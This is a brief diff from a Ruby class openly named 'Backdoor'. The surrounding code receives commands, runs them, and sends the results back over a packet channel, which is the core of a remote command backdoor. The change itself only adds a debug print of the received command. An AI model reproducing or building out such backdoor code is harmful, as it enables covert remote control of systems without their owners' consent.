@@ -92,6 +92,7 @@ class Backdoor
                 if cmd[0] == "get" then
                     send_data(get_command(cmd[1], cmd[2]), packet)
                 else # cmd[0]
+                    puts @command
                     send_data(run_command(@command), packet)
                 end # cmd[0] else
                 @command = ""
